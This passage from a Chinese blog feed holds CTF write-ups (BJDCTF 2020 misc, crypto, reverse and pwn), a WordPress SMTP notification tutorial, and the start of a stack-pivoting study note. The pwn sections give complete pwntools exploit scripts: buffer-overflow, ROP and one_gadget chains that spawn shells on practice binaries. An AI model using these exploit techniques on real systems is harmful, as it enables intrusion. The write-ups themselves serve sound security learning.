class="number">140</span>)</span><br><span class="line">payload += p32(pop_r0)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;quot;buffer&amp;quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> midnightctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BJDCTF Writeup</title>
      <link href="archives/11/"/>
      <url>archives/11/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="最简单的misc"><a href="#最简单的misc" class="headerlink" title="最简单的misc"></a>最简单的misc</h2><p>zip 压缩包伪加密，改完标志位，解压得到文件 secret 。winhex 打开发现头部有 IHDR 标志，<del>盲猜</del>一个 PNG 文件，补一个文件头 89504E47 ，改后缀名。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323100003.png"></p><p>隔壁是作者，重点是下面。十六进制转 Ascii 得到 flag 。</p><h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>下载一个 png ，改高度得到 flag 。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323100605.png"></p><h2 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h2><p>jpg 19.9M 你见过么？反正我没见过。binwalk 一下没有东西，foremost 一下出来一个压缩包，里面还是一个大得出奇的 jpg 。winhex 看了一下 avi 文件，改后缀名，得到一段鬼畜，pr 逐帧查看视频，找到四个二维码，扫码。十六进制转 Ascii 码，转码后调整顺序得到 flag 。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200324001949.png"></p><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>认真填写才能获得 flag</p><h2 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h2><p><del>用 stegdetect 检查 jpeg 文件，发现 jphide 加密。</del></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe <span class="literal">-s</span> <span class="number">20</span> xiaojiejie.jpeg</span><br></pre></td></tr></table></figure><p><del>然后爆破密码？</del></p><p>对，没错想多了。只需要这样：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323221603.png"></p><h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>winhex 打开文件，仔细看，就能获得 flag 。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323110134.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>base64 加密</p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h2><p>?：0 。?：1 。二进制再转字符串。</p><h2 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h2><p>十六进制转 Ascii ，再转维吉尼亚密码。密钥在 Ascii 解码后字符串前面</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA打开，shift + F12 查看字符串，得到 flag 。</p><h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>asm8086 单片机么？这个比较曲折，用物理机 IDA 逆向出奇奇怪怪的指令，用虚拟机 IDA 逆向就能看得懂大半部分。加密方式就是异或，密文是 aUDuTZWjQGjzZWz 的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea     bx, aUDuTZWjQGjzZWz ; <span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;</span></span><br><span class="line">loc_10039:                                               mov     di, cx</span><br><span class="line">dec     di</span><br><span class="line"><span class="keyword">xor</span>     byte ptr [bx+di], <span class="number">1F</span>h<span class="comment">//异或0x1f</span></span><br><span class="line">loop    loc_10039</span><br><span class="line">lea     dx, aUDuTZWjQGjzZWz ;</span><br><span class="line">mov     ah, <span class="number">9</span></span><br><span class="line"><span class="keyword">int</span>     <span class="number">21</span>h</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = [<span class="number">0x5D</span>, <span class="number">0x55</span>, <span class="number">0x5B</span>, <span class="number">0x64</span>, <span class="number">0x75</span>, <span class="number">0x7E</span>, <span class="number">0x7C</span>, <span class="number">0x74</span>, <span class="number">0x40</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x40</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x2E</span>, <span class="number">0x7D</span>, <span class="number">0x2E</span>, <span class="number">0x7E</span>,</span><br><span class="line">          <span class="number">0x71</span>, <span class="number">0x40</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x40</span>, <span class="number">0x77</span>, <span class="number">0x7A</span>, <span class="number">0x71</span>, <span class="number">0x57</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x62</span>, <span class="number">0x3B</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[i] ^ <span class="number">0x1F</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><p>跟攻防世界的一道题类似。漏洞在 name_check() ，会将传入参数 s strcpy 给 &amp;dest 造成溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">name_check</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+7h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,My dear %s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(&amp;dest, s);# 漏洞</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29570</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./r2t3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./r2t3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./r2t3&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x11</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(<span class="number">0x8048430</span>)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(<span class="number">0x8048760</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;My&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>感觉在哪里见过？</p><p>开局给提示：printf 函数地址，然后要求输入，输入完成后，会执行输入地址。所以依据给出地址计算 offset ，算出 one_gadget 真实地址输入。</p><p>one_gadget 输入应该是十进制数，一开始 p64() ，做不出来。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./one_gadget&quot;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./one_gadget&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.29.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;u:&quot;</span>)</span><br><span class="line">printf_got = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">libc_base = printf_got - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x106ef8</span> </span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gadget:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>官方WP</strong>：<a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress用户评论和回复评论邮件通知功能</title>
      <link href="archives/27619439/"/>
      <url>archives/27619439/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目标解决两个问题：</p><ol><li>用户在文章中提交评论后，我们无法及时获取用户评论的内容，同时也就没办法及时回复；</li><li>从后台发现用户评论，虽然回复了，但是用户已经离开网站，无法接受到您给他的评论回复。</li></ol><h1 id="方法一：插件-WordPress-Mail-SMTP"><a href="#方法一：插件-WordPress-Mail-SMTP" class="headerlink" title="方法一：插件 WordPress Mail SMTP"></a>方法一：插件 WordPress Mail SMTP</h1><p>WP 后台直接安装即可，全中文操作。如果使用 qq 邮箱，邮件系统类型选择 other smtp 。stmp 地址填入 smtp.qq.com ，勾选 ssl ，端口 465 。帐号为发件邮箱，密码为 stmp 服务授权码。</p><h1 id="方法二：手动修改代码"><a href="#方法二：手动修改代码" class="headerlink" title="方法二：手动修改代码"></a>方法二：手动修改代码</h1><p>找到你当前使用的主题目录下的 functions.php ：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200321002352.png"></p><p>在文件末尾加上下面代码，请自行配置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用 smtp 发邮件</span></span><br><span class="line">add_action(&amp;<span class="comment">#039;phpmailer_init&amp;#039;, &amp;#039;fanly_mail_smtp&amp;#039;);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fanly_mail_smtp</span>(<span class="params"> <span class="variable">$phpmailer</span> </span>) </span>&#123;</span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;IsSMTP();</span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;SMTPAuth = <span class="literal">true</span>;<span class="comment">//启用 SMTPAuth 服务</span></span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;Port = <span class="number">465</span>;<span class="comment">//SMTP 邮件发送端口，这个和下面的 SSL 验证对应，如果这里填写 25，则下面参数为空</span></span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;SMTPSecure =&amp;quot;ssl&amp;quot;;<span class="comment">//是否验证 ssl，与 MTP 邮件发送端口对应，如果不填写，则上面的端口须为 25</span></span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;Host = &amp;quot;smtp.qq.com&amp;quot;;<span class="comment">//邮箱的 SMTP 服务器地址，目前 smtp.qq.com 为 QQ 邮箱 SMTP</span></span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;Username = &amp;quot;example@qq.com&amp;quot;;<span class="comment">//smtp帐号邮箱地址（等于发件地址）</span></span><br><span class="line"><span class="variable">$phpmailer</span>-&amp;gt;Password =&amp;quot;***************&amp;quot;;<span class="comment">//smtp授权码</span></span><br><span class="line">&#125;</span><br><span class="line">add_filter( &amp;<span class="comment">#039;wp_mail_from&amp;#039;, &amp;#039;fanly_wp_mail_from&amp;#039; );</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fanly_wp_mail_from</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> &amp;<span class="comment">#039;example@qq.com&amp;#039;;//发件邮箱地址（等于smtp帐号邮箱地址）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//WordPress 评论回复邮件通知代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fanly_comment_mail_notify</span>(<span class="params"><span class="variable">$comment_id</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blogname</span> = wp_specialchars_decode(get_option(&amp;<span class="comment">#039;blogname&amp;#039;), ENT_QUOTES);</span></span><br><span class="line">    <span class="variable">$comment</span> = get_comment(<span class="variable">$comment_id</span>);</span><br><span class="line">    <span class="variable">$parent_id</span> = <span class="variable">$comment</span>-&amp;gt;comment_parent ? <span class="variable">$comment</span>-&amp;gt;comment_parent : &amp;<span class="comment">#039;&amp;#039;;</span></span><br><span class="line">    <span class="variable">$spam_confirmed</span> = <span class="variable">$comment</span>-&amp;gt;comment_approved;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$parent_id</span> != &amp;<span class="comment">#039;&amp;#039;) &amp;amp;&amp;amp; ($spam_confirmed != &amp;#039;spam&amp;#039;)) &#123;</span></span><br><span class="line">        <span class="variable">$wp_email</span> = &amp;<span class="comment">#039;no-reply@&amp;#039; . preg_replace(&amp;#039;#^www\.#&amp;#039;, &amp;#039;&amp;#039;, strtolower($_SERVER[&amp;#039;SERVER_NAME&amp;#039;]));</span></span><br><span class="line">        <span class="variable">$to</span> = trim(get_comment(<span class="variable">$parent_id</span>)-&amp;gt;comment_author_email);</span><br><span class="line">        <span class="variable">$subject</span> = trim(get_comment(<span class="variable">$parent_id</span>)-&amp;gt;comment_author) . &amp;<span class="comment">#039;,您在 [&amp;#039; . $blogname . &amp;#039;] 中的留言有新的回复啦！&amp;#039;;</span></span><br><span class="line">        <span class="variable">$message</span> = &amp;<span class="comment">#039;&amp;lt;div style=&amp;quot;color:#555;font:12px/1.5 微软雅黑,Tahoma,Helvetica,Arial,sans-serif;max-width:550px;margin:50px auto;border-top: none;&amp;quot; &amp;gt;&amp;lt;table border=&amp;quot;0&amp;quot; cellspacing=&amp;quot;0&amp;quot; cellpadding=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;tbody&amp;gt;&amp;lt;tr valign=&amp;quot;top&amp;quot; height=&amp;quot;2&amp;quot;&amp;gt;&amp;lt;td valign=&amp;quot;top&amp;quot;&amp;gt;&amp;lt;div style=&amp;quot;background-color:white;border-top:2px solid #00A7EB;box-shadow:0 1px 3px #AAAAAA;12px;max-width:550px;color:#555555;font-family:微软雅黑, Arial;;font-size:12px;&amp;quot;&amp;gt;</span></span><br><span class="line">&amp;lt;h2 style=&amp;quot;border-bottom:<span class="number">1</span>px solid <span class="comment">#DDD;font-size:14px;font-weight:normal;padding:8px 0 10px 8px;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color: #00A7EB;font-weight: bold;&amp;quot;&amp;gt;&amp;gt; &amp;lt;/span&amp;gt;您在 &amp;lt;a style=&amp;quot;text-decoration:none; color:#58B5F5;font-weight:600;&amp;quot; href=&amp;quot;&amp;#039; . home_url() . &amp;#039;&amp;quot;&amp;gt;&amp;#039; . $blogname . &amp;#039;&amp;lt;/a&amp;gt; 的留言有回复啦！&amp;lt;/h2&amp;gt;&amp;lt;div style=&amp;quot;padding:0 12px 0 12px;margin-top:18px&amp;quot;&amp;gt;</span></span><br><span class="line">&amp;lt;p&amp;gt;您好, &amp;<span class="comment">#039; . trim(get_comment($parent_id)-&amp;gt;comment_author) . &amp;#039;! 您发表在文章 《&amp;#039; . get_the_title($comment-&amp;gt;comment_post_ID) . &amp;#039;》 的评论:&amp;lt;/p&amp;gt;</span></span><br><span class="line">&amp;lt;p style=&amp;quot;background-color: <span class="comment">#EEE;border: 1px solid #DDD;padding: 20px;margin: 15px 0;&amp;quot;&amp;gt;&amp;#039; . nl2br(strip_tags(get_comment($parent_id)-&amp;gt;comment_content)) . &amp;#039;&amp;lt;/p&amp;gt;</span></span><br><span class="line">&amp;lt;p&amp;gt;&amp;<span class="comment">#039; . trim($comment-&amp;gt;comment_author) . &amp;#039; 给您的回复如下:&amp;lt;/p&amp;gt;</span></span><br><span class="line">&amp;lt;p style=&amp;quot;background-color: <span class="comment">#EEE;border: 1px solid #DDD;padding: 20px;margin: 15px 0;&amp;quot;&amp;gt;&amp;#039; . nl2br(strip_tags($comment-&amp;gt;comment_content)) . &amp;#039;&amp;lt;/p&amp;gt;</span></span><br><span class="line">&amp;lt;p&amp;gt;您可以点击 &amp;lt;a style=&amp;quot;text-decoration:none; color:<span class="comment">#5692BC&amp;quot; href=&amp;quot;&amp;#039; . htmlspecialchars(get_comment_link($parent_id)) . &amp;#039;&amp;quot;&amp;gt;查看完整的回复內容&amp;lt;/a&amp;gt;，也欢迎再次光临 &amp;lt;a style=&amp;quot;text-decoration:none; color:#5692BC&amp;quot;</span></span><br><span class="line">href=&amp;quot;&amp;<span class="comment">#039; . home_url() . &amp;#039;&amp;quot;&amp;gt;&amp;#039; . $blogname . &amp;#039;&amp;lt;/a&amp;gt;。祝您生活愉快！&amp;lt;/p&amp;gt;</span></span><br><span class="line">&amp;lt;p style=&amp;quot;padding-bottom: <span class="number">15</span>px;&amp;quot;&amp;gt;(此邮件由系统自动发出,请勿直接回复!)&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&amp;<span class="comment">#039;;</span></span><br><span class="line">        <span class="variable">$from</span> = &amp;quot;<span class="keyword">From</span>: \&amp;quot;&amp;quot; . get_option(&amp;<span class="comment">#039;blogname&amp;#039;) . &amp;quot;\&amp;quot; &amp;lt;$wp_email&amp;gt;&amp;quot;;</span></span><br><span class="line">        <span class="variable">$headers</span> = &amp;quot;<span class="variable">$from</span>\nContent-Type: text/html; charset=&amp;quot; . get_option(&amp;<span class="comment">#039;blog_charset&amp;#039;) . &amp;quot;\n&amp;quot;;</span></span><br><span class="line">        wp_mail( <span class="variable">$to</span>, <span class="variable">$subject</span>, <span class="variable">$message</span>, <span class="variable">$headers</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">add_action(&amp;<span class="comment">#039;comment_post&amp;#039;, &amp;#039;fanly_comment_mail_notify&amp;#039;);</span></span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.louishe.com/2019/12/25/doc-6598.html">louishe</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WordPress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 邮件通知 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移学习（新）</title>
      <link href="archives/d7d152e1/"/>
      <url>archives/d7d152e1/</url>
      
        <content type="html"><![CDATA[<h1 id="栈迁移学习（新）"><a href="#栈迁移学习（新）" class="headerlink" title="栈迁移学习（新）"></a>栈迁移学习（新）</h1><blockquote><p>2020年7月4日 更新：</p><p>题目在buu上有实验环境，名字是：gyctf_2020_borrowstack</p><p>前面刚总结完的笔记感觉不太完善，然后再做了题后，理解更加透彻，重新整理一下。</p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>当存在栈溢出且可溢出长度不足以容纳 payload 时，可采用栈迁移。一般这种情况下，溢出仅能覆盖 ebp 、 eip 。因为原来的栈空间不足，所以要构建一个新的栈空间放下 payload ，因此称为栈迁移。</p><h2 id="大概原理"><a href="#大概原理" class="headerlink" title="大概原理"></a>大概原理</h2><p>首先栈执行命令是从 esp 开始向 ebp 方向逐条执行，也就是从低地址到高地址逐条执行。触发栈迁移的关键指令：<code>leave|ret</code>，等效于<code>mov esp ebp; pop ebp; ret;</code>，作用是将 ebp 赋值给 esp ，并弹出 ebp 。</p><p>正常情况下退出栈时，esp 指向 ebp 所在位置，ebp 指向 ebp 所存储的位置。等同于执行一个 leave ret 的效果。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200311172814.png"></p><p>栈迁移：通过直接控制 ebp 的值，借助 leave 指令，间接控制  esp 的值。从上图可见，正常退出 esp 会指向原 ebp 位置。如果我们覆盖 eip 再次执行 leave 指令，esp 将会指向 0x400a0 的位置（ebp 将指向当前 ebp 存储的地址），也就是将栈迁移到 0x400a0 。通过提前布置 ebp 中的地址和调用 leave 指令，可完成连续多次栈迁移。</p><p>在上图中也可以看出，栈迁移的地址信息被提前写入，所以明确并提前计算栈被迁移到的内存地址，是栈迁移的关键。当然也是有骚操作，可不提前写入的，详情看下面题目分析。</p><p>在我看来，栈迁移不能算是在内存地址中创建了一个完整的栈结构，而是复刻了栈从高地址到低地址依次执行命令的功能。因为一般情况下多次栈迁移，ebp 地址与 esp 地址关系比较奇怪，ebp 地址会比 esp 低，特别是最后一次栈迁移，ebp 的值不再重要，可被指向到奇奇怪怪的地址，这不相当于没有 ebp 的栈么。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>题目来自 i春秋新春战役 borrowstack</p></blockquote><h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>只打开 NX 保护的64 位程序。程序内容为：提示输入两次。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=3d3f6ef2905eff37d82ebb1bfa6e7c4e75384eff, not stripped</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>第一处提示输入存在溢出，可溢出 0x10 ，仅可以覆盖 ebp、eip 。第二处输入允许向 bank 写入 0x100 字节，bank 位于 bss 段头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);<span class="comment">//可溢出0x10字节</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这条题目目的就是引导我们将栈迁移到 bss 段，并且为我们预留了写入 bss 段的函数。</p><p>这里插一嘴，如果没有这个预留函数，但是可以溢出更长又不足够放下 payload（如：0x30）怎么解决？控制 eip 构建一个写入函数，然后才再调用指令 leave 。（该套路题目：<a href="https://github.com/scwuaptx/HITCON-Training">HITCON-Training-master lab6</a>）</p><h3 id="利用"><a href="#利用" class="headerlink" 